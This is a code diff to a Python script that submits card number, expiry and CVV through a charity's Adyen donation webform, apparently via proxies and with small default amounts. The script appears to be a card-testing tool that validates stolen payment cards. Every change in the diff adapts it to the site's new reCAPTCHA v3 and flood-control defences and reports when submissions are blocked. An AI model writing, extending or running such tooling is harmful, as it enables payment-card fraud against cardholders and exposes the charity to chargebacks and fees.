@@ -31,7 +31,7 @@ FORM_ID = "webform_submission_donations_adyen_node_2732_add_form"
 
 # Default params — user can change amount via settings
 DEFAULT_CURRENCY_SYMBOL = "US$"
-DEFAULT_AMOUNT = "1"
+DEFAULT_AMOUNT = "3"
 DEFAULT_FREQUENCY = "give_once"
 
 # Adyen checkoutshopper base — the site uses 'live-au' for live
@@ -435,7 +435,10 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None, amount=None, currency=None):
         if not tokens.get('form_build_id'):
             return {"status": "error", "response": "Could not extract form tokens"}
 
-        # Solve math captcha
+        # Check for reCAPTCHA v3 (site changed from math captcha)
+        has_recaptcha = 'grecaptcha_token' in html1 or 'recaptcha_v3' in html1
+        
+        # Solve math captcha (legacy — may not be present)
         captcha_answer = _solve_math_captcha(html1)
         captcha_field = _extract_math_field_name(html1)
         captcha_extras = _extract_captcha_sid(html1)
@@ -449,16 +452,28 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None, amount=None, currency=None):
         amount_field = _extract_currency_amount_field(html1, currency)
 
         # ---- POST Step 1: Amount selection ----
+        # Use '_other_' radio with custom amount if not in presets
+        valid_amounts = re.findall(rf'name="{amount_field}\[radios\]"\s+value="([^"]+)"', html1)
+        if amount in valid_amounts:
+            radio_value = amount
+        else:
+            radio_value = "_other_"
+        
         step1_data = {
             "donation_frequency": DEFAULT_FREQUENCY,
             "donation_currency": currency,
-            f"{amount_field}[radios]": amount,
+            f"{amount_field}[radios]": radio_value,
             "donate_towards": "Medical humanitarian projects around the world",
             "form_build_id": tokens['form_build_id'],
             "form_token": tokens.get('form_token', ''),
             "form_id": tokens.get('form_id', FORM_ID),
+            "protect_form_flood_control": "protect_form_flood_control",
             btn_name: btn_value,
         }
+        
+        # If using custom amount, add the other input
+        if radio_value == "_other_":
+            step1_data[f"{amount_field}[other]"] = amount
 
         # Add captcha if present
         if captcha_answer and captcha_field:
@@ -479,9 +494,14 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None, amount=None, currency=None):
 
         html2 = r2.text
 
-        # Check if we're on step 2
-        if 'Your details' not in html2 and 'first_name' not in html2:
-            # Maybe captcha failed, try extracting new captcha
+        # Check if wizard advanced — if still on page 1, reCAPTCHA likely blocked us
+        wp_match = re.search(r'data-webform-wizard-current-page="(\d+)"', html2)
+        current_page = int(wp_match.group(1)) if wp_match else 1
+        
+        if current_page <= 1:
+            if has_recaptcha:
+                return {"status": "error", "response": "reCAPTCHA v3 blocked — site requires browser-based captcha solving"}
+            # Legacy: try math captcha retry
             captcha_answer2 = _solve_math_captcha(html2)
             if captcha_answer2:
                 tokens2 = _extract_form_tokens(html2)
@@ -494,6 +514,8 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None, amount=None, currency=None):
                     step1_data.update(captcha_extras2)
                 r2 = session.post(r2.url, data=step1_data, headers=_get_headers(referer=r2.url), timeout=30, allow_redirects=True)
                 html2 = r2.text
+            else:
+                return {"status": "error", "response": "Form submission blocked — captcha validation failed"}
 
         # ---- POST Step 2: Personal details ----
         tokens2 = _extract_form_tokens(html2)
